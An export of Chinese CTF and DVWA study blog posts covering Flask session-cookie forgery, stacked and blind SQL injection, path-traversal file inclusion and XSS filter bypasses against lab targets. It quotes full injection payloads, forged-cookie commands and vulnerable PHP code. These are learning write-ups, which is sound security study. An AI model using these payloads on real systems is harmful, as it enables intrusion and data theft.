[{"title":"HCTF2018 admin 复现","date":"2020-04-09T14:06:44.000Z","path":"2020/04/09/HCTF2018-admin-复现/","text":"session 详细了解学习的博客：https://blog.csdn.net/h19910518/article/details/79348051 写的真是好 session_start()这是个无任何返回值的函数，既不会报错，也不会成功。它的作用是开启session，并随机生成一个唯一的32位的session_id，类似于这样：4c83638b3b0dbf65583181c2f89168ec 每次我们访问一个页面，如果有开启session，也就是有session_start() 时，就会自动生成一个session_id 来标注是这次会话的唯一ID，同时也会自动往cookie里写入一个名字为PHPSESSID的变量，它的值正是session_id，当这次会话没结束，再次访问的时候，服务器会去读取这个PHPSESSID的cookie是否有值有没过期，如果能够读取到，则继续用这个session_id，如果没有，就会新生成一个session_id，同时生成PHPSESSID这个cookie。由于默认生成的这个PHPSESSID cookie是会话，也就是说关闭浏览器就会过期掉，所以，下次重新浏览时，会重新生成一个session_id。 session 一般存贮在服务器端的\\tmp目录下，同样也是用到session_id。session_id是32位的，服务器会用 sess_前缀 + session_id 的形式存在这个临时目录下每一次生成的session_id都会生成一个这样的文件，用来保存这次会话的session信息。例如sess_bjvlo4p38cfqkr1hr7pe924ts3 这样的文件名 往session文件中写数据:例如$_SESSION[‘hello’] = 123;$_SESSION[‘word’] = 456; 数据存放形式为：hello|i:123;word|i:456;是序列化的数据，我们肉眼也能读出来。当我们往$_SESSION全局变量里写数据时，它会自动往这个文件里写入。读取session的时候，也会根据session_id 找到这个文件，然后读取需要的session变量。 大致总结: HTTP请求一个页面后，如果用到开启session，会去读cookie中的PHPSESSID是否有，如果没有，则会新生成一个session_id，先存入cookie中的PHPSESSID中，再生成一个sess_前缀文件。当有写入$_SESSION的时候，就会往sess_文件里序列化写入数据。当读取的session变量的时候，先会读取cookie中的PHPSESSID，获得session_id，然后再去找这个sess_sessionid文件，来获取对应的数据。由于默认的PHPSESSID是临时的会话，在浏览器关闭后，会消失，所以，我们重新访问的时候，会新生成session_id和sess_这个文件。 有关session的几个变量 SID,session_id(),$_COOKIE[“PHPSESSID”] SID 是一个系统常量，SID包含着会话名以及会话 ID 的常量，格式为 “name=ID”，或者如果会话 ID 已经在适cookie 中设定时则为空字符串，第一次显示的时候输出的是SID的值，当你刷新的时候，因为已经在cookie中存在，所以显示的是一个空字符串。session_id() 函数用来返回当前会话的session_id，它会去读取cookie中的name，也就是PHPSESSID值。 session的相关配置 [Session]session.save_handler = filessession.save_path = “d:/wamp/tmp”session.use_cookies = 1session.name = PHPSESSIDsession.auto_start = 0session.cookie_lifetime = 0session.serialize_handler = phpsession.gc_divisor = 1000session.gc_probability = 1session.gc_maxlifetime = 1440 session.save_handler = files 表示的是session的存储方式，默认的是files文件的方式保存，sess_efdsw34534efsdfsfsf3r3wrresa, 保存在 session.save_path = “d:/wamp/tmp” 里，所有这2个都是可配值得。我们上面的例子就是用的这种默认的方式。 save_handler 不仅仅只能用文件files，还可以用我们常见的memcache 和 redis 来保存。 session.use_cookies 默认是1，表示会在浏览器里创建值为PHPSESSID的session_id，session.name = PHPSESSID 找个配置就是改这个名字的，你可以改成PHPSB, 那这样就再浏览器里生成名字为PHPSB的session_id 。 session.auto_start = 0 用来是否需要自动开启session，默认是不开启的，所有我们需要在代码中用到session_start();函数开启，如果设置成1，那么session_id 也会自动就生成了。 session.cookie_lifetime = 0 这个是设置在客户端生成PHPSESSID这个cookie的过期时间，默认是0，也就是关闭浏览器就过期，下次访问，会再次生成一个session_id。所以，如果想关闭浏览器会话后，希望session信息能够保持的时间长一点，可以把这个值设置大一点，单位是秒。 复现学习的博客：https://www.jianshu.com/p/f92311564ad0 解法一 flask session伪造说是复现，其实对flask一点都不了解，好像以buuok上的题来当web入门好像有点拉跨，不过看都看了，硬学下去吧 什么是flask学习的博客：https://www.cnblogs.com/mrchige/p/6387674.html Flask 是一个 web 框架。也就是说 Flask 为你提供工具，库和技术来允许你构建一个 web 应用程序。这个 wdb 应用程序可以使一些 web 页面、博客、wiki、基于 web 的日历应用或商业网站。Flask 属于微框架（micro-framework）这一类别，微架构通常是很小的不依赖于外部库的框架。这既有优点也有缺点，优点是框架很轻量，更新时依赖少，并且专注安全方面的 bug，缺点是，你不得不自己做更多的工作，或通过添加插件增加自己的依赖列表。 我裂开了，bluelake主题下的博客好像不能写入flask的代码…，就干脆删了不写学习的过程了 解法一 伪造flask session学习的博客：https://www.jianshu.com/p/f92311564ad0 进入页面右上角可以login和register，先随便注册一个然后登录登录之后可以change password，转到那个页面查看页面源码可以发现泄露了源码之后去查看源码先进去APP文件夹 -&gt; 查看route.py 看app.route()主要的文件有哪些 先查看index.html的内容 发现只要以admin身份登录就可以拿到flag，回到注册页面注册admin会发现用户已被注册而flask的session是存放在cookie中的，也就是存放在浏览器上，那么就有了可能伪造session的思路 要伪造session还需要知道签名，去github的源码导出看看有没有签名，最后在config.py中发现了签名 拿到签名后还需要解密加密flask脚本，在google中可以搜索到https://github.com/noraj/flask-session-cookie-manager 下载后开始伪造session： 先解密，得到解密之前的数据，将当前用户名改成admin这里有python2和python3两个脚本，用python3失败了，用python2成功了 python2 flask_session_cookie_manager2.py decode -s “ckj123” -c “.eJw9kEGLwjAQhf_KkrOH2tKL4GEltSjMQJdoyVzEbWvTSeNCq2gj_vfNuuBhYOA9Pt57D3E4Dc1oxOIyXJuZOHS1WDzEx7dYCM2m176Kwa86lNkEsu8g3zLKdiKVeV0WKZa7iGR7I7nviHsDvPNawQ0cWSg3HrhKw2_Qf1nMswl9EaPPElDgQZIjXhmtqonyXaq5CEzqQYVzm0h7iFFtmeTakCzuwXcHvzZQ6gS5D5n-_GtLarMUz5moxuF0uPzY5vyuALJmUm2qfRYhk4N875CrBD11wPauYx2TyxJSK4sqxGI7x8_lC9e5Y9u8SftzKHr7V85HFwRxHOuTmInr2Ayv2cQ8Es9f9Y5uyQ.Xo82lg.zGqI1MszM160rzt9fWR5-0DFJDU” -s 后跟签名-c 后跟当前cookie的value解密后的数据: 将修改后的数据再进行加密伪造session python2 flask_session_cookie_manager2.py encode -s “ckj123” -t “ckj123” -t “{u’csrf_token’: ‘07ce89c1466f0ef67776b291cf6fa7e0d5172954’, u’user_id’: u’10’, u’name’: u’admin’, u’image’: ‘Vu4g’, u’_fresh’: True, u’_id’: ‘b8ec7630b41209b0bc482e13ad95e4d80d5bf9a253a302fd1b32792fa74d4a274671713306ff0aa72de9b43afe16e2b4c3652cd1ad41a7131a1f769b443aade2’}” 加密后的数据: 之后再把这个伪造的session覆盖点当前的session的value就可以拿到flag了","tags":[]},{"title":"buuoj web刷题记录二","date":"2020-04-08T14:36:56.000Z","path":"2020/04/08/buuoj web刷题记录二/","text":"easy_tornado参考学习的博客: https://blog.csdn.net/weixin_45784586/article/details/104589198?fps=1&amp;locationNum=2 解题方法是ssti模板注入，现在关于web啥基础都没有，现在深究估计会浪费时间，有基础之后再来了解 解题脚本中有关python的知识可以学习 1234567import hashlibfilename = '/fllllllllllllag'cookie_secret = '7012f546-ae20-45cb-8b05-19bf1e96d0bf'file_md5 = hashlib.md5(filename.encode(encoding='UTF-8')).hexdigest()print(hashlib.md5((cookie_secret+file_md5).encode(encoding=\"UTF-8\")).hexdigest()) hashlib是涉及安全散列和消息摘要，提供多个不同的加密算法接口，如SHA1、SHA224、SHA256、SHA384、SHA512、MD5等encode(encoding=’utf-8’) 作用是以 encoding 指定的编码格式编码字符串，这里是’utf-8’方式hash.hexdigest() 作用是 返回摘要，作为十六进制数据字符串值 easy_sql参考学习的网站:https://blog.csdn.net/wyj_1216/article/details/104227659?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3 https://blog.csdn.net/weixin_37839711/article/details/81562550 看其它师傅的博客找到了这题的源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;?php session_start(); include_once \"config.php\"; $post = array(); $get = array(); global $MysqlLink; //GetPara(); $MysqlLink = mysqli_connect(\"localhost\",$datauser,$datapass); if(!$MysqlLink)&#123; die(\"Mysql Connect Error!\"); &#125; $selectDB = mysqli_select_db($MysqlLink,$dataName); if(!$selectDB)&#123; die(\"Choose Database Error!\"); &#125; foreach ($_POST as $k=&gt;$v)&#123; if(!empty($v)&amp;&amp;is_string($v))&#123; $post[$k] = trim(addslashes($v)); &#125; &#125; foreach ($_GET as $k=&gt;$v)&#123; &#125; &#125; //die(); ?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;&lt;form action=\"\" method=\"post\"&gt;&lt;input type=\"text\" name=\"query\"&gt;&lt;input type=\"submit\"&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php if(isset($post['query']))&#123; $BlackList = \"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\\\"\"; //var_dump(preg_match(\"/&#123;$BlackList&#125;/is\",$post['query'])); if(preg_match(\"/&#123;$BlackList&#125;/is\",$post['query']))&#123; //echo $post['query']; die(\"Nonono.\"); &#125; if(strlen($post['query'])&gt;40)&#123; die(\"Too long.\"); &#125; $sql = \"select \".$post['query'].\"||flag from Flag\"; mysqli_multi_query($MysqlLink,$sql); do&#123; if($res = mysqli_store_result($MysqlLink))&#123; while($row = mysqli_fetch_row($res))&#123; print_r($row); &#125; &#125; &#125;while(@mysqli_next_result($MysqlLink)); &#125; ?&gt;?&gt; 从源码中可以看到被过滤的关键字有:$BlackList = “prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|&quot;“; __mysql 中prepare, execute, deallocate的使用方法PREPARE语句准备好一条SQL语句，并分配给这条SQL语句一个名字供之后调用。准备好的SQL语句通过EXECUTE命令执行，通过DEALLOCATE PREPARE命令释放掉。 语句的名字不区分大小写。准备好的SQL语句名字可以是字符串，也可以是用户指定的包含SQL文本的变量。PREPARE中的SQL文本必须代表一条单独的SQL语句而不能是多条SQL语句。在SQL语句中，? 字符用来作为后面执行查询使用的一个参数。? 不能加上引号，及时打算将它们绑定到字符变量中也不可以。__ 例子:PREPARE: ? 只能用变量传递，不能使用常数MariaDB [test]&gt; execute sq1 using 1, 2; 是错误的 mysqli_multi_query($MysqlLink,$sql);从这条语句发现存在堆叠注入mysqli_multi_query() 函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。 输入1;show tables; 可以注出当前数据库中的表 $sql = “select “.$post[‘query’].”||flag from Flag”;根据这一行代码可以考虑将$post[‘query’]与flag 连接起来，从而输出的时候输出flag 由于在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode 模式：pipes_as_concat 来实现oracle 的一些功能 输入 1;set sql_mode=PIPES_AS_CONCAT;select 1 就可以输出flag","tags":[{"name":"ssti模板注入","slug":"ssti模板注入","permalink":"http://wafuter.jxustctf.top/tags/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"}]},{"title":"buuoj刷题记录一","date":"2020-04-07T05:36:07.000Z","path":"2020/04/07/buuoj刷题记录一/","text":"HCTF Warmupphp有关知识 highlight_file(filename, return) 函数对文件进行语法高亮显示。 filename 必需。要进行高亮处理的 PHP 文件的路径。return 可选。如果设置 true，则本函数返回高亮处理的代码。 mb_substr ( string $str , int $start [, int $length = NULL [, string $encoding = mb_internal_encoding() ]] ) : string mb_substr() 函数返回字符串的一部分，之前我们学过 substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。 12345&lt;?phpecho mb_substr(\"菜鸟教程\", 0, 2);// 输出：菜鸟?&gt; mb_strpos()：返回要查找的字符串在别一个字符串中首次出现的位置mb_strpos (haystack ,needle ) haystack：要被检查的字符串。needle：要搜索的字符串。 source.php 源码分析 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"]; if (! isset($page) || !is_string($page)) &#123; echo \"you can't see it\"; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo \"you can't see it\"; return false; &#125; &#125; if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) &#123; include $_REQUEST['file']; exit; &#125; else &#123; echo \"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\"; &#125; ?&gt; 大概逻辑是通过if语句的三个判断条件之后通过文件包含将ffffllllaaaagggg中的flag输出mb_substr函数返回字符串的一部分， mb_strpos返回其它字符串在要查找的字符串首次出现的位置 那么设置payload=hint.php/source.php?…就可以绕过checkFile的检查，之后就是猜路径输出flag 完成后的payload: http://d236b4e8-5d5d-4527-959f-71f34bd3df71.node3.buuoj.cn/source.php?file=source.php?../../../../../ffffllllaaaagggg easy_sql堆叠注入: 利用;连接多条mysql语句一起执行 发现存在字符型注入, 尝试使用union联合查询的时候发现过滤了很多mysql语句，之后找wp学习去 学习的wp: https://blog.csdn.net/qq_26406447/article/details/90643951 学习到还存在堆叠注入: 输入 ‘;show databases;# 获取数据库名 输入’;show tables;# 可以获取表名 通过联合use database与desc table还可以查看其它数据库中表的字段 得到了words和1919810931114514这两张表先看看这两张表中分别有什么字段 输入’;desc words;# 查看word表中的字段 输入’;desc `1919810931114514`;# 查看1919810931114514表中的字段 也可以用show columns from words; 语句查询 找到flag字段后接下来就是考虑如何输出，虽然过滤了常用的mysql语句， 但是没有过滤rename与alter语句 由于输入1进行查询的时候比较明显的可以看出来是输出words表中的内容 那么可以 修改words表为其它名称，比如word，修改1919810931114514表为words 再往“words”表中加入id字段， 将flag改成data， 之后输入’ or true # 就可输出flag payload:‘;rename table words to word1;rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key;alter table words change flag data varchar(100);# 输入: ‘;show tables;# 与’;desc words;# 可以看到字段名已被更改 flag:","tags":[]},{"title":"dvwa1.10学习之sql盲注","date":"2020-04-03T02:27:52.000Z","path":"2020/04/03/dvwa1-10学习之sql盲注/","text":"参考学习的网站: https://www.freebuf.com/articles/web/120985.html kali linux 配置dvwa环境 https://github.com/ethicalhack3r/DVWA先去github上下载压缩包解压后把文件夹放入/var/www/html并重命名为dvwa 给予dvwa文件夹相应的权限chmod -R 755 /var/www/html/dvwa 按照github上的指示来， 在mysql中进行如下操作 先启动mysql：sudo service mysql start sudo mysql -u root -p __mysql&gt; create database dvwa;Query OK, 1 row affected (0.00 sec) mysql&gt; grant all on dvwa.* to dvwa@localhost identified by ‘SuperSecretPassword99’;Query OK, 0 rows affected, 1 warning (0.01 sec) mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec)__ 再退出mysql： exit 在修改dvwa/config/config.inc.php文件中的内容为:$_DVWA[ ‘db_user’ ] = ‘dvwa’;$_DVWA[ ‘db_password’ ] = ‘SuperSecretPassword99’;$_DVWA[ ‘db_database’ ] = ‘dvwa’; 再启动apache2服务sudo service apache2 start 打开浏览器输入localhost/dvwa 就会自动跳转到setup.php之后在点击下方的 Create/Reset Database 就行了 进入login.php 页面, 输入账号密码分别为admin, password 就可进入dvwa页面 low先测试是字符型还是数字型的注入 输入 ‘ or true #, 显示 ID已存在，则是字符型注入 由于回显不会显示数据， 所以需要以爆破的方式来猜解数据 爆破数据库名的长度 输入 ‘ or length(database())=x #, x = 1, 2, 3, 4… 获取数据库名长度后爆破数据库名，使用二分法爆破 输入’ or ascii(substr(database(), 1, 1)) &gt;/&lt; x # substr函数是字符串截取函数 根据回显结果是否显示exist来判断处于哪个范围 爆破数据库中的表的数量 先猜解数据库中有几张表 输入’ or (select count(table_name) from information_schema.tables where table_schema=database()) = x #x=1,2,3,4… 测试出来x=2, 也就是数据库中有两张表 爆破表的长度 ‘ or length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=x # x = 1, 2, 3…, 测试出来x=9limit x, y 的意思是从偏移x开始取y个数据 substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1) 的意思是取第一张表名 123456789101112131415161718192021222324mysql&gt; select * from t1 where username='' or substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='t1';+----------+----------+| username | password |+----------+----------+| cx | root || 1 | 222 || 2 | 333 || 3 | 444 || 4 | 555 || 5 | 666 || 1 | 222 || 2 | 333 |+----------+----------+mysql&gt; select * from t1 where username='' or substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='t2';Empty set (0.00 sec)mysql&gt; show tables;+----------------+| Tables_in_test |+----------------+| t1 || t2 |+----------------+2 rows in set (0.00 sec) 爆破表名 ‘ or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) &gt;/&lt; x # 还是采用二分法爆破 爆破表中的字段名的数量 ‘ or (select count(column_name) from information_schema.columns where table_name=’guestbook’/‘users’)=x #2 = 1, 2, 3… 爆破字段长度与字段名 长度: ‘ or length(substr((select column_name from information_schema.columns where table_name=’guestbook’/‘users’) limit 0,1, 1))=x # 字段名: 重复利用上面的二分法 爆破数据还是采用二分法 延时注入允许sleep语句存在的话 可以在if(判断语句， 结果1， 结果2) 例子:mysql&gt; delete from admin where username=’1’ and sleep(if(length((database()))&gt;=5, 2, 0));Query OK, 0 rows affected (2.00 sec) 输入 ‘ or sleep(if(length(database()) &gt; x, 5, 0)) # 根据是否延迟可以判断数据库名的长度也可以把sleep语句放在if语句里面 ’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)#","tags":[{"name":"dvwa1.10, sql盲注","slug":"dvwa1-10-sql盲注","permalink":"http://wafuter.jxustctf.top/tags/dvwa1-10-sql%E7%9B%B2%E6%B3%A8/"}]},{"title":"DVWA1.10学习之sql注入","date":"2020-03-31T12:16:43.000Z","path":"2020/03/31/DVWA1.10学习之sql注入/","text":"参考学习的网站：https://www.freebuf.com/articles/web/120747.html 一. low 服务器端代码: 123456789101112131415161718192021222324&lt;?phpif( isset( $_REQUEST[ 'Submit' ] ) ) &#123; // Get input $id = $_REQUEST[ 'id' ]; // Check database $query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[\"first_name\"]; $last = $row[\"last_name\"]; // Feedback for end user $html .= \"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;\"; &#125; mysqli_close($GLOBALS[\"___mysqli_ston\"]);&#125;?&gt; 代码中没有对id做检查与过滤， 明显存在sql注入 一般情况下看不到后端代码， 所以要进行多种测试 mysql 中的注释符有： 1231. \"#\"2. \"-- \"3. \"/* */\" 1. 判断是否存在注入，注入是字符型还是数字型输入1返回查询结果 输入 ‘ or true – ‘ 返回多个结果，因此是字符型注入 2. 猜解SQL查询语句中的字段数 输入 ‘ or true order by 1 – ‘, 查询成功输入 ‘ or true order by 2 – ‘, 查询成功输入 ‘ or true order by 3 – ‘，查询失败 3. 确定显示的字段顺序 输入 ‘ union select 1, 2; – ‘ 4. 获取当前数据库 输入 ‘ union select 1, database(); – ‘ __5. 获取数据库中的表 我的数据库版本 12345678Current database: test+-----------+| version() |+-----------+| 8.0.12 |+-----------+1 row in set (0.02 sec) 不允许直接使用select * from t1 group by username;必须前后一致 select username from t1 group by username; mysql 中group_concat 函数作用：能够将相同的行组合起来 例如： 12345678910111213141516mysql&gt; select 1, table_name from information_schema.tables where table_schema=database();+---+------------+| 1 | TABLE_NAME |+---+------------+| 1 | t1 || 1 | t2 |+---+------------+2 rows in set (0.00 sec)mysql&gt; select 1, group_concat(table_name) from information_schema.tables where table_schema=database();+---+--------------------------+| 1 | group_concat(table_name) |+---+--------------------------+| 1 | t1,t2 |+---+--------------------------+1 row in set (0.00 sec) 输入 ‘ union select 1, group_concat(table_name) from information_schema.tables where table_schema=database(); –’可以获取数据库中的表名 关于information_schema: information_schema这这个数据库中保存了MySQL服务器所有数据库的信息。 如数据库名，数据库的表，表栏的数据类型与访问权限等。 再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表， 每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。 information_schema的表schemata中的列schema_name记录了所有数据库的名字 information_schema的表tables中的列table_schema记录了所有数据库的名字 information_schema的表tables中的列table_name记录了所有数据库的表的名字 information_schema的表columns中的列table_schema记录了所有数据库的名字 information_schema的表columns中的列table_name记录了所有数据库的表的名字 information_schema的表columns中的列column_name记录了所有数据库的表的列的名字(所有字段名) 6. 获取表中的字段名 输入 ‘ union select 1, group_concat(column_name) from information_schema.columns where table_name=’users’; – ‘ 可以获取users 表的所有字段名 __7. 获取表中的所有字段内容 输入 ‘ union select group_concat(avatar, failed_login, first_name, last_login, last_name, password), group_concat(user, user_id) from users; # 可以获取所有字段内容 这里的联合注入 因为guestbook表中只有两个字段， 所以查t2表的时候要用group_concat连接各个字段，保持前后查询字段一致 二. medium服务器端代码 12345678910111213141516171819202122232425262728293031&lt;?phpif( isset( $_POST[ 'Submit' ] ) ) &#123; // Get input $id = $_POST[ 'id' ]; $id = mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $id); $query = \"SELECT first_name, last_name FROM users WHERE user_id = $id;\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query) or die( '&lt;pre&gt;' . mysqli_error($GLOBALS[\"___mysqli_ston\"]) . '&lt;/pre&gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Display values $first = $row[\"first_name\"]; $last = $row[\"last_name\"]; // Feedback for end user $html .= \"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;\"; &#125;&#125;// This is used later on in the index.php page// Setting it here so we can close the database connection in here like in the rest of the source scripts$query = \"SELECT COUNT(*) FROM users;\";$result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );$number_of_rows = mysqli_fetch_row( $result )[0];mysqli_close($GLOBALS[\"___mysqli_ston\"]);?&gt; 解决burp suite 抓不到本地包的情况参考连接:https://blog.csdn.net/qq_43662512/article/details/99698833 先进入http://burp 下载证书， 之后导入firefox浏览器中 打开命令行， 输入ipconfig/all， 查看本地的ipv4地址， 之后把localhost替换成这个IP地址就抓包成功了 一般步骤: 先判断是不是字符型或数字型 输入’ or true # 报错 输入抓包更改参数为 1 or true #可以查询所有数据 利用order by 猜解有多少个字段 抓包更改参数为 1 or union select 1, 2 # 确定显示的字段顺序 抓包更改参数为 1 union select 1, database() # 注出数据库名 抓包更改参数为 1 union select 1, group_concat(table_name) from information_schema.talbes where table_schema=database() # 可以注出数据库中有多少张表 获取表中的字段名抓包更改参数为 1 union select 1, group_concat(column_name) from information_schema.columns where table_name=’users’; #会出现查询失败的错误，因为mysqli_real_escape_string函数的关系 ‘’被转义了，但是可以用十六进制绕过 12&gt;&gt;&gt; binascii.hexlify(b\"users\")b'7573657273' 之后抓包更改参数为 1 union select group_concat(avatar, failed_login, first_name, last_login, last_name, password), group_concat(user, user_id) from users # 获取所有字段内容 3. High 服务器端代码: 123456789101112131415161718192021222324&lt;?phpif( isset( $_SESSION [ 'id' ] ) ) &#123; // Get input $id = $_SESSION[ 'id' ]; // Check database $query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;Something went wrong.&lt;/pre&gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[\"first_name\"]; $last = $row[\"last_name\"]; // Feedback for end user $html .= \"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;\"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); &#125;?&gt; limit 1 的作用是返回1条记录 high 级别就加了条limit 1语句， 这个比较好绕， 像low级别一样注释掉就行了输入 ‘ or true # 直接跳到最后一步输入 ‘ or true union select group_concat(user_id,first_name,last_name),group_concat(password) from users # 需要特别提到的是，High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。","tags":[{"name":"sql注入，DVWA1.10","slug":"sql注入，DVWA1-10","permalink":"http://wafuter.jxustctf.top/tags/sql%E6%B3%A8%E5%85%A5%EF%BC%8CDVWA1-10/"}]},{"title":"DVWA1.10学习之XSS","date":"2020-03-30T11:40:19.000Z","path":"2020/03/30/DVWA1.10学习之XSS/","text":"参考的学习网站 https://www.freebuf.com/articles/web/123779.html DVWA之XSSxss的概念XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。 DOM型的XSS由于其特殊性，常常被分为第三种，这是一种基于DOM树的XSS。例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。 反射型xss1. low 12345678910111213&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;';&#125;?&gt; 上述代码直接引用了name参数，没有做任何的过滤与检查，存在明显的xss漏洞 输入 &lt;script&gt; alert(/xss/) &lt;/script&gt; 就可以进行漏洞利用 2. Medium 123456789&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;?&gt; array_key_exists 函数的作用是判断数组中是否存在指定的key 上述代码对输入进行了过滤，使用str_replace函数将输入中的&lt;script&gt;全部替换成’’，但是可以轻松的绕过 1.双写绕过 &lt;scr&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt; 2.大小写混淆绕过 &lt;ScRipt&gt; alert(/xss/) &lt;/script&gt; 3. High 123456789&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;?&gt; preg_replace 函数执行一个正则表达式的搜索和替换语法：preg_replace (pattern ,replacement ,subject,limit,count )pattern: 正则表达式(字符串或字符串数组)replacement: 用于替换的字符串或字符串数组subject: 要进行搜索和替换的字符串或字符串数组。limit: 可选。每个模式在每个subject上进行替换的最大次数。默认是 -1(无限)。count: 可选。完成的替换次数 正则表达式解析：. -&gt; 匹配除\\n之外的任何单个字符，代替任何字符* -&gt; 匹配其左边的子表达式0次或多次() -&gt; 标记子表达式的开始和结束位置修正符i -&gt; 匹配时忽略大小写 漏洞利用： 这样就无法使用&lt;script&gt;标签注入XSS代码了，但是可以通过img, body等标签的事件或者iframe等标签的src注入恶意的js代码 &lt;img src=1 onerror=alert(/xss/)&gt; 4. impossible 12345678910111213&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $name = htmlspecialchars( $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; impossible级别的代码使用htmlspecialchars函数把预定义的字符&amp;、”、 ’、&lt;、&gt;转换为HTML实体，防止浏览器将其作为HTML元素。 存储型XSS1. low 12345678910111213141516&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = mysql_real_escape_string( $message ); // Sanitize name input $name = 